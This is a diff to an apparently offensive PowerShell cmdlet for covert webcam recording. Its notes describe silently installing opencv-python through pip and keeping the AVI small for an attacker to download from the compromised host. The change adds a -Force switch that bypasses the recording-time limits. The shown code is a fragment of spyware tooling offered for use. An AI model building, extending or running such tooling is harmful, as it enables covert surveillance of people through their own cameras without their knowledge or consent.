@@ -15,10 +15,10 @@
 
 .NOTES
    Remark: recording of webcam turns 'on' the camera ligth.
-   Remark: cmdlet will auto-install 'opencv-python' package using pip3 (silent)
+   Remark: cmdlet will auto-install 'opencv-python' package using pip (silent)
    Parameter RecTime accepts values from 8 seconds (minimum) up to 60 seconds (max)
    to prevent the AVI file to be very large if attacker needs to download it from host.
-   Remark: Invoke force 'true' to bypass cmdlet internal checks\tests and force execution.
+   Remark: Invoke -force 'true' to bypass cmdlet tests\recordtime restrictions + force exec.
 
 .Parameter RecTime
    The amount of time to rec in seconds (default: 10)
@@ -135,12 +135,15 @@ If(Test-Path -Path "$WorkingDir\outpy.avi")
    Remove-Item -Path "$WorkingDir\outpy.avi" -Force
 }
 
-If($RecTime -gt 60 -or $RecTime -lt 8)
+If($Force -ieq "false")
 {
-   write-host "  x " -ForegroundColor Red -NoNewline
-   write-host "NotOptimal: " -ForegroundColor DarkGray -NoNewline
-   write-host "record time, defaulting to 10 sec." -ForegroundColor Yellow
-   [int]$RecTime = '10'
+   If($RecTime -gt 60 -or $RecTime -lt 8)
+   {
+      write-host "  x " -ForegroundColor Red -NoNewline
+      write-host "NotOptimal: " -ForegroundColor DarkGray -NoNewline
+      write-host "record time, defaulting to 10 sec." -ForegroundColor Yellow
+      [int]$RecTime = '10'
+   }
 }
 
 
